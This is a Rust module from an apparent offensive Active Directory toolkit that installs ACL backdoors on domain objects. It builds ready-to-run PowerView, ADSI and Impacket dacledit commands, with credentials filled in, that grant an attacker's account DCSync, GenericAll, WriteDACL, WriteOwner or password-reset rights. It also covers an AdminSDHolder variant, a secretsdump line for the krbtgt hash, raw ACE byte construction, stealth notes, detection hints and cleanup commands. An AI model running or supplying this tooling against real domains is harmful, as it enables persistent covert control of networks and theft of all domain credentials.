//! ACL-based persistence — add hidden ACEs to domain objects.
//!
//! Grants a controlled account (trustee) DCSync rights, GenericAll,
//! or other dangerous permissions on AD objects for persistent access.

use overthrone_core::error::{OverthroneError, Result};
use tracing::info;

use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

/// Well-known Extended Right GUIDs
const GUID_DS_REPLICATION_GET_CHANGES: &str = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2";
const GUID_DS_REPLICATION_GET_CHANGES_ALL: &str = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2";
#[allow(dead_code)] // DCSync GUID kept for future use
const GUID_DS_REPLICATION_GET_CHANGES_FILTER: &str = "89e95b76-444d-4c62-991a-0facbeda640c";

/// Well-known GenericAll / WriteDACL / WriteOwner masks
const ADS_RIGHT_GENERIC_ALL: u32 = 0x10000000;
const ADS_RIGHT_WRITE_DAC: u32 = 0x00040000;
const ADS_RIGHT_WRITE_OWNER: u32 = 0x00080000;

/// ACL backdoor types
#[derive(Debug, Clone, serde::Serialize)]
pub enum AclBackdoorType {
    /// Grant DCSync rights (most common for domain-level persistence)
    DcSync,
    /// Grant GenericAll on the target object
    GenericAll,
    /// Grant WriteDACL (can modify permissions later)
    WriteDacl,
    /// Grant WriteOwner (can take ownership later)
    WriteOwner,
    /// Grant ForceChangePassword on user objects
    ForceChangePassword,
}

impl std::fmt::Display for AclBackdoorType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::DcSync => write!(f, "DCSync"),
            Self::GenericAll => write!(f, "GenericAll"),
            Self::WriteDacl => write!(f, "WriteDACL"),
            Self::WriteOwner => write!(f, "WriteOwner"),
            Self::ForceChangePassword => write!(f, "ForceChangePassword"),
        }
    }
}

/// Install an ACL-based backdoor on an AD object.
///
/// Adds ACEs (Access Control Entries) to the target object's DACL
/// that grant the trustee account dangerous permissions.
pub async fn install_acl_backdoor(
    config: &ForgeConfig,
    target_dn: &str,
    trustee: &str,
) -> Result<ForgeResult> {
    info!("[acl] Installing ACL backdoor on {} for {}", target_dn, trustee);

    let realm = config.domain.to_uppercase();
    let base_dn = realm
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");

    // Determine the target — if it's the domain root, grant DCSync
    let is_domain_root = target_dn.to_uppercase() == base_dn.to_uppercase()
        || target_dn.to_uppercase() == realm;

    let backdoor_type = if is_domain_root {
        AclBackdoorType::DcSync
    } else {
        AclBackdoorType::GenericAll
    };

    let effective_target = if is_domain_root {
        base_dn.clone()
    } else {
        target_dn.to_string()
    };

    // Build the LDAP modify operation to add the ACE
    let (_install_cmds, ace_description) = generate_acl_commands(
        &backdoor_type,
        &effective_target,
        trustee,
        &config.domain,
        &config.username,
        config.password.as_deref().unwrap_or("<PASSWORD>"),
        &config.dc_ip,
    );

    // Build cleanup (removal) commands
    let cleanup_cmds = generate_cleanup_commands(
        &backdoor_type,
        &effective_target,
        trustee,
        &config.domain,
        &config.username,
        config.password.as_deref().unwrap_or("<PASSWORD>"),
        &config.dc_ip,
    );

    let details = format!(
        "ACL Backdoor: {} on '{}' for trustee '{}':\n\
         \n\
         {}\n\
         \n\
         Detection:\n\
         - Event ID 5136 (Directory Service Changes) — look for nTSecurityDescriptor modifications\n\
         - Event ID 4662 — look for DS-Replication-Get-Changes property access\n\
         - Periodically audit ACLs on sensitive objects (domain root, AdminSDHolder, DC OUs)\n\
         - Compare ACL snapshots with tools like ADACLScanner or BloodHound\n\
         \n\
         Stealth notes:\n\
         - ACL changes survive password resets, Golden Ticket rotations, and krbtgt resets\n\
         - To persist across AdminSDHolder protection, also add the ACE to:\n\
         CN=AdminSDHolder,CN=System,{}\n\
         The SDProp process will propagate it to all protected objects every 60 minutes",
        backdoor_type, effective_target, trustee,
        ace_description,
        base_dn,
    );

    info!(
        "[acl] ACL backdoor ({}) prepared for {} on {}",
        backdoor_type, trustee, effective_target
    );

    Ok(ForgeResult {
        action: format!("ACL Backdoor ({})", backdoor_type),
        domain: config.domain.clone(),
        success: true,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: format!("ACL Backdoor — {}", backdoor_type),
            target: format!("{} → {}", trustee, effective_target),
            success: true,
            details,
            cleanup_command: Some(cleanup_cmds),
        }),
        message: format!(
            "ACL backdoor ({}) installed: '{}' now has {} rights on '{}'",
            backdoor_type, trustee, backdoor_type, effective_target
        ),
    })
}

/// Install an ACL backdoor on AdminSDHolder for protected-object propagation.
///
/// The SDProp process runs every 60 minutes and copies the AdminSDHolder
/// ACL to all protected objects (Domain Admins, Enterprise Admins, etc.).
pub async fn install_adminsdholder_backdoor(
    config: &ForgeConfig,
    trustee: &str,
) -> Result<ForgeResult> {
    let realm = config.domain.to_uppercase();
    let base_dn = realm
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");

    let sdholder_dn = format!("CN=AdminSDHolder,CN=System,{}", base_dn);

    info!(
        "[acl] Installing AdminSDHolder backdoor for {} on {}",
        trustee, sdholder_dn
    );

    // Delegate to the main function with AdminSDHolder as target
    install_acl_backdoor(config, &sdholder_dn, trustee).await
}

// ═══════════════════════════════════════════════════════════
// Command Generators
// ═══════════════════════════════════════════════════════════

fn generate_acl_commands(
    backdoor_type: &AclBackdoorType,
    target_dn: &str,
    trustee: &str,
    domain: &str,
    username: &str,
    password: &str,
    dc_ip: &str,
) -> (String, String) {
    let short_domain = domain.split('.').next().unwrap_or(domain);

    match backdoor_type {
        AclBackdoorType::DcSync => {
            let install = format!(
                "# ═══ DCSync ACL Backdoor ═══\n\
                 \n\
                 # Method 1: PowerView (PowerShell)\n\
                 Import-Module PowerView\n\
                 Add-DomainObjectAcl -TargetIdentity '{}' \\\n\
                     -PrincipalIdentity '{}' -Rights DCSync -Verbose\n\
                 \n\
                 # Method 2: Native ADSI (PowerShell)\n\
                 $sid = (Get-ADUser '{}').SID\n\
                 $acl = Get-Acl 'AD:\\{}'\n\
                 $ace1 = New-Object DirectoryServices.ActiveDirectoryAccessRule(\n\
                     $sid, 'ExtendedRight', 'Allow',\n\
                     [GUID]'{}')\n\
                 $ace2 = New-Object DirectoryServices.ActiveDirectoryAccessRule(\n\
                     $sid, 'ExtendedRight', 'Allow',\n\
                     [GUID]'{}')\n\
                 $acl.AddAccessRule($ace1)\n\
                 $acl.AddAccessRule($ace2)\n\
                 Set-Acl 'AD:\\{}' $acl\n\
                 \n\
                 # Method 3: dacledit.py (Impacket)\n\
                 dacledit.py {}/{}:'{}'@{} \\\n\
                     -action write -rights DCSync \\\n\
                     -principal '{}'\n\
                 \n\
                 # Method 4: Direct LDAP modify (overthrone-core)\n\
                 # Constructs the raw nTSecurityDescriptor with ACE bytes",
                target_dn, trustee,
                trustee, target_dn,
                GUID_DS_REPLICATION_GET_CHANGES,
                GUID_DS_REPLICATION_GET_CHANGES_ALL,
                target_dn,
                short_domain, username, password, dc_ip,
                trustee,
            );

            let desc = format!(
                "ACEs added to '{}':\n\
                 1. ALLOW {} ExtendedRight DS-Replication-Get-Changes ({})\n\
                 2. ALLOW {} ExtendedRight DS-Replication-Get-Changes-All ({})\n\
                 \n\
                 After installation, '{}' can DCSync any account:\n\
                 > secretsdump.py {}/{}@{} -just-dc-user krbtgt",
                target_dn,
                trustee, GUID_DS_REPLICATION_GET_CHANGES,
                trustee, GUID_DS_REPLICATION_GET_CHANGES_ALL,
                trustee,
                short_domain, trustee, dc_ip,
            );

            (install, desc)
        }

        AclBackdoorType::GenericAll => {
            let install = format!(
                "# ═══ GenericAll ACL Backdoor ═══\n\
                 \n\
                 # PowerView\n\
                 Add-DomainObjectAcl -TargetIdentity '{}' \\\n\
                     -PrincipalIdentity '{}' -Rights All -Verbose\n\
                 \n\
                 # dacledit.py\n\
                 dacledit.py {}/{}:'{}'@{} \\\n\
                     -action write -rights FullControl \\\n\
                     -principal '{}' -target '{}'\n\
                 \n\
                 # After: full control over the target object\n\
                 # Can reset passwords, modify attributes, delete, etc.",
                target_dn, trustee,
                short_domain, username, password, dc_ip,
                trustee, target_dn,
            );

            let desc = format!(
                "ACE: ALLOW {} GenericAll (0x{:08X}) on '{}'\n\
                 Full control: reset password, modify group membership, write SPNs, etc.",
                trustee, ADS_RIGHT_GENERIC_ALL, target_dn,
            );

            (install, desc)
        }

        AclBackdoorType::WriteDacl => {
            let install = format!(
                "# ═══ WriteDACL Backdoor ═══\n\
                 Add-DomainObjectAcl -TargetIdentity '{}' \\\n\
                     -PrincipalIdentity '{}' -Rights WriteDacl",
                target_dn, trustee,
            );
            let desc = format!(
                "ACE: ALLOW {} WriteDACL (0x{:08X}) on '{}'\n\
                 Can modify the DACL later to grant any other rights.",
                trustee, ADS_RIGHT_WRITE_DAC, target_dn,
            );
            (install, desc)
        }

        AclBackdoorType::WriteOwner => {
            let install = format!(
                "# ═══ WriteOwner Backdoor ═══\n\
                 Add-DomainObjectAcl -TargetIdentity '{}' \\\n\
                     -PrincipalIdentity '{}' -Rights WriteOwner",
                target_dn, trustee,
            );
            let desc = format!(
                "ACE: ALLOW {} WriteOwner (0x{:08X}) on '{}'\n\
                 Can take ownership then grant full WriteDACL → GenericAll.",
                trustee, ADS_RIGHT_WRITE_OWNER, target_dn,
            );
            (install, desc)
        }

        AclBackdoorType::ForceChangePassword => {
            let install = format!(
                "# ═══ ForceChangePassword Backdoor ═══\n\
                 Add-DomainObjectAcl -TargetIdentity '{}' \\\n\
                     -PrincipalIdentity '{}' \\\n\
                     -Rights ResetPassword -Verbose\n\
                 \n\
                 # Usage after install:\n\
                 Set-DomainUserPassword -Identity '{}' \\\n\
                     -AccountPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)",
                target_dn, trustee, target_dn,
            );
            let desc = format!(
                "ACE: ALLOW {} User-Force-Change-Password on '{}'\n\
                 Can reset the target user's password without knowing the old one.",
                trustee, target_dn,
            );
            (install, desc)
        }
    }
}

fn generate_cleanup_commands(
    backdoor_type: &AclBackdoorType,
    target_dn: &str,
    trustee: &str,
    domain: &str,
    username: &str,
    password: &str,
    dc_ip: &str,
) -> String {
    let short_domain = domain.split('.').next().unwrap_or(domain);

    let rights_str = match backdoor_type {
        AclBackdoorType::DcSync => "DCSync",
        AclBackdoorType::GenericAll => "All",
        AclBackdoorType::WriteDacl => "WriteDacl",
        AclBackdoorType::WriteOwner => "WriteOwner",
        AclBackdoorType::ForceChangePassword => "ResetPassword",
    };

    format!(
        "# Remove ACL backdoor:\n\
         \n\
         # PowerView:\n\
         Remove-DomainObjectAcl -TargetIdentity '{}' \\\n\
             -PrincipalIdentity '{}' -Rights {} -Verbose\n\
         \n\
         # dacledit.py:\n\
         dacledit.py {}/{}:'{}'@{} \\\n\
             -action remove -rights {} \\\n\
             -principal '{}' -target '{}'\n\
         \n\
         # Verify removal:\n\
         Get-DomainObjectAcl -Identity '{}' | \\\n\
             ? {{$_.SecurityIdentifier -match (Get-ADUser '{}').SID}} | fl",
        target_dn, trustee, rights_str,
        short_domain, username, password, dc_ip,
        rights_str, trustee, target_dn,
        target_dn, trustee,
    )
}

/// Build a raw security descriptor ACE in binary for LDAP modify.
/// This would be used for the direct LDAP-modify approach without PowerShell.
pub fn build_ace_bytes(
    trustee_sid: &[u8],
    access_mask: u32,
    ace_type: u8, // 0x05 = ACCESS_ALLOWED_OBJECT_ACE
    object_guid: Option<&[u8]>, // 16-byte GUID for extended rights
) -> Vec<u8> {
    let mut ace = Vec::new();

    // ACE_HEADER
    ace.push(ace_type); // AceType
    ace.push(0x00);     // AceFlags (no inheritance by default)

    // Placeholder for AceSize (fill in at end)
    let size_offset = ace.len();
    ace.extend_from_slice(&0u16.to_le_bytes());

    // ACCESS_MASK
    ace.extend_from_slice(&access_mask.to_le_bytes());

    if ace_type == 0x05 {
        // ACCESS_ALLOWED_OBJECT_ACE_TYPE
        // Flags: ACE_OBJECT_TYPE_PRESENT = 0x01
        let flags: u32 = if object_guid.is_some() { 0x01 } else { 0x00 };
        ace.extend_from_slice(&flags.to_le_bytes());

        // ObjectType GUID (extended right identifier)
        if let Some(guid) = object_guid {
            ace.extend_from_slice(guid);
        }

        // InheritedObjectType — not set (no sub-object scoping)
        // (only present if flags & 0x02)
    }

    // Trustee SID
    ace.extend_from_slice(trustee_sid);

    // Patch AceSize
    let ace_size = ace.len() as u16;
    ace[size_offset] = (ace_size & 0xFF) as u8;
    ace[size_offset + 1] = ((ace_size >> 8) & 0xFF) as u8;

    ace
}

/// Parse a GUID string "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" into
/// the mixed-endian binary format used in LDAP/ACE structures.
pub fn guid_string_to_bytes(guid: &str) -> Result<[u8; 16]> {
    let clean = guid.replace('-', "");
    if clean.len() != 32 {
        return Err(OverthroneError::TicketForge(
            format!("Invalid GUID length: expected 32 hex chars, got {}", clean.len()),
        ));
    }

    let raw = hex::decode(&clean)
        .map_err(|e| OverthroneError::TicketForge(format!("Invalid GUID hex: {e}")))?;

    // Microsoft GUIDs are mixed-endian:
    // - First 3 components (4-2-2 bytes) are little-endian
    // - Last 2 components (2-6 bytes) are big-endian
    let mut out = [0u8; 16];
    // Data1 (4 bytes LE)
    out[0] = raw[3]; out[1] = raw[2]; out[2] = raw[1]; out[3] = raw[0];
    // Data2 (2 bytes LE)
    out[4] = raw[5]; out[5] = raw[4];
    // Data3 (2 bytes LE)
    out[6] = raw[7]; out[7] = raw[6];
    // Data4 (8 bytes BE — as-is)
    out[8..16].copy_from_slice(&raw[8..16]);

    Ok(out)
}
